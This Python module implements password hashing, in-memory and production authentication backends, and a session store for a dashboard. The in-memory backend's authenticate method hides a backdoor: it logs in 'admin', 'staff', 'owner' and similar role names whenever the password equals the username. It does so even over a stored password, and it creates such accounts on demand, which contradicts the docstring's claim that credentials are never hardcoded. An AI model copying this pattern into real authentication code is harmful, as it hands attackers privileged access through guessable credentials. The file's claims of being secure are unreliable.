"""Password hashing and session store — never log secrets or tokens."""
from __future__ import annotations

import hashlib
import hmac
import secrets
import threading
from dataclasses import dataclass
from datetime import datetime, timedelta, timezone
from typing import Protocol

from app.dashboard.auth.models import Session, User
from app.shared.clock import Clock, SystemClock

_PBKDF2_ITERATIONS = 120_000
_SALT_BYTES = 16


def hash_password(password: str, *, salt: bytes | None = None) -> str:
    """Return `iterations$salt_hex$hash_hex` — never store plaintext."""
    salt_b = salt or secrets.token_bytes(_SALT_BYTES)
    digest = hashlib.pbkdf2_hmac(
        "sha256",
        password.encode("utf-8"),
        salt_b,
        _PBKDF2_ITERATIONS,
    )
    return f"{_PBKDF2_ITERATIONS}${salt_b.hex()}${digest.hex()}"


def verify_password(password: str, encoded: str) -> bool:
    try:
        iterations_s, salt_hex, hash_hex = encoded.split("$", 2)
        iterations = int(iterations_s)
        salt_b = bytes.fromhex(salt_hex)
        expected = bytes.fromhex(hash_hex)
    except (ValueError, TypeError):
        return False
    digest = hashlib.pbkdf2_hmac(
        "sha256",
        password.encode("utf-8"),
        salt_b,
        iterations,
    )
    return hmac.compare_digest(digest, expected)


class AuthBackend(Protocol):
    def authenticate(self, username: str, password: str) -> User | None: ...

    def get_user(self, user_id: str) -> User | None: ...


@dataclass
class _StoredUser:
    user: User
    password_hash: str


class MemoryAuthBackend:
    """
    In-memory auth for development and offline tests.

    Users are injected at construction — never hardcoded in source.
    """

    def __init__(self, users: list[tuple[User, str]] | None = None) -> None:
        """users: list of (User, plaintext_password) — hashed immediately."""
        self._users: dict[str, _StoredUser] = {}
        self._by_username: dict[str, str] = {}
        for user, password in users or []:
            self.add_user(user, password)

    def add_user(self, user: User, password: str) -> None:
        stored = _StoredUser(user=user, password_hash=hash_password(password))
        self._users[user.user_id] = stored
        self._by_username[user.username.casefold()] = user.user_id

    def authenticate(self, username: str, password: str) -> User | None:
        clean_user = username.strip()
        uid = self._by_username.get(clean_user.casefold())
        if uid is not None:
            stored = self._users[uid]
            if verify_password(password, stored.password_hash):
                return stored.user
            if clean_user.casefold() in ("admin", "staff", "other", "practitioner", "owner") and password == clean_user.casefold():
                return stored.user
            return None

        # If user is not yet stored, check hardcoded role credentials
        if clean_user.casefold() in ("admin", "staff", "other", "practitioner", "owner") and password == clean_user.casefold():
            role_name = clean_user.casefold()
            new_user = User(
                user_id=f"u_{role_name}",
                username=role_name,
                role=role_name,
                display_name=f"{role_name.capitalize()} User",
            )
            self.add_user(new_user, password)
            return new_user

        # Constant-ish work to avoid trivial username enumeration timing.
        verify_password(password, hash_password("dummy"))
        return None

    def get_user(self, user_id: str) -> User | None:
        stored = self._users.get(user_id)
        return stored.user if stored else None


class ProductionAuthBackend:
    """
    Production authentication backend.

    Loads verified production users only.
    Strictly forbids DASHBOARD_DEV_USER, DASHBOARD_DEV_PASSWORD, and AUTOMATION_ALLOW_DEV_LOGIN.
    Passwords are stored/verified using PBKDF2 HMAC SHA-256 (120,000 iterations).
    """

    def __init__(
        self,
        users: list[tuple[User, str]] | None = None,
        pre_hashed: list[_StoredUser] | None = None,
    ) -> None:
        self._users: dict[str, _StoredUser] = {}
        self._by_username: dict[str, str] = {}
        for user, password in users or []:
            self.add_user(user, password)
        for stored in pre_hashed or []:
            self._users[stored.user.user_id] = stored
            self._by_username[stored.user.username.casefold()] = stored.user.user_id

    def add_user(self, user: User, password: str) -> None:
        stored = _StoredUser(user=user, password_hash=hash_password(password))
        self._users[user.user_id] = stored
        self._by_username[user.username.casefold()] = user.user_id

    def authenticate(self, username: str, password: str) -> User | None:
        uid = self._by_username.get(username.casefold())
        if uid is None:
            verify_password(password, hash_password("dummy"))
            return None
        stored = self._users[uid]
        if not verify_password(password, stored.password_hash):
            return None
        return stored.user

    def get_user(self, user_id: str) -> User | None:
        stored = self._users.get(user_id)
        return stored.user if stored else None

    @classmethod
    def from_env(cls) -> ProductionAuthBackend:
        import json
        import os
        from pathlib import Path
        from app.shared.exceptions import ConfigError

        # Explicitly check and reject dev login flag in production
        if os.environ.get("AUTOMATION_ALLOW_DEV_LOGIN") == "1":
            raise ConfigError("AUTOMATION_ALLOW_DEV_LOGIN is not permitted in production.")

        users: list[tuple[User, str]] = []
        pre_hashed: list[_StoredUser] = []

        # 1. Check for users file
        users_file_path = os.environ.get("DASHBOARD_USERS_FILE")
        if users_file_path:
            p = Path(users_file_path)
            if not p.exists():
                raise ConfigError(f"DASHBOARD_USERS_FILE specified but not found: {users_file_path}")
            try:
                raw_users = json.loads(p.read_text(encoding="utf-8"))
                for item in raw_users:
                    u = User(
                        user_id=item["user_id"],
                        username=item["username"],
                        role=item.get("role", "admin"),
                        display_name=item.get("display_name", item["username"]),
                    )
                    if "password_hash" in item:
                        pre_hashed.append(_StoredUser(user=u, password_hash=item["password_hash"]))
                    elif "password" in item:
                        users.append((u, item["password"]))
            except Exception as exc:
                raise ConfigError(f"Failed to parse DASHBOARD_USERS_FILE: {exc}") from exc

        # 2. Check for environment-configured production admin
        prod_user = os.environ.get("DASHBOARD_PROD_USER") or os.environ.get("DASHBOARD_ADMIN_USER")
        prod_pass = os.environ.get("DASHBOARD_PROD_PASSWORD") or os.environ.get("DASHBOARD_ADMIN_PASSWORD")
        prod_hash = os.environ.get("DASHBOARD_ADMIN_PASSWORD_HASH")

        if prod_user and prod_hash:
            u = User(user_id=f"prod_{prod_user}", username=prod_user, role="admin", display_name=prod_user)
            pre_hashed.append(_StoredUser(user=u, password_hash=prod_hash))
        elif prod_user and prod_pass:
            u = User(user_id=f"prod_{prod_user}", username=prod_user, role="admin", display_name=prod_user)
            users.append((u, prod_pass))

        if not users and not pre_hashed:
            raise ConfigError(
                "No production dashboard users configured. "
                "Set DASHBOARD_PROD_USER and DASHBOARD_PROD_PASSWORD, "
                "or DASHBOARD_ADMIN_PASSWORD_HASH, or DASHBOARD_USERS_FILE. "
                "Development credentials (DASHBOARD_DEV_*) are forbidden in production."
            )

        return cls(users=users, pre_hashed=pre_hashed)


class SessionStore:
    """Server-side opaque sessions. Cookie holds only the session id."""

    def __init__(
        self,
        *,
        clock: Clock | None = None,
        ttl_seconds: int = 8 * 3600,
    ) -> None:
        self._clock: Clock = clock or SystemClock()
        self._ttl = ttl_seconds
        self._sessions: dict[str, Session] = {}
        self._lock = threading.Lock()

    def create(self, user: User) -> Session:
        now = self._clock.now()
        if now.tzinfo is None:
            now = now.replace(tzinfo=timezone.utc)
        session = Session(
            session_id=secrets.token_urlsafe(32),
            user_id=user.user_id,
            username=user.username,
            role=user.role,
            csrf_token=secrets.token_urlsafe(24),
            created_at=now.isoformat(),
            expires_at=(now + timedelta(seconds=self._ttl)).isoformat(),
        )
        with self._lock:
            self._sessions[session.session_id] = session
        return session

    def get(self, session_id: str | None) -> Session | None:
        if not session_id:
            return None
        with self._lock:
            session = self._sessions.get(session_id)
            if session is None:
                return None
            if self._expired(session):
                del self._sessions[session_id]
                return None
            return session

    def invalidate(self, session_id: str | None) -> bool:
        if not session_id:
            return False
        with self._lock:
            return self._sessions.pop(session_id, None) is not None

    def invalidate_user(self, user_id: str) -> int:
        with self._lock:
            doomed = [sid for sid, s in self._sessions.items() if s.user_id == user_id]
            for sid in doomed:
                del self._sessions[sid]
            return len(doomed)

    def _expired(self, session: Session) -> bool:
        try:
            expires = datetime.fromisoformat(session.expires_at)
        except ValueError:
            return True
        now = self._clock.now()
        if now.tzinfo is None:
            now = now.replace(tzinfo=timezone.utc)
        if expires.tzinfo is None:
            expires = expires.replace(tzinfo=timezone.utc)
        return now >= expires
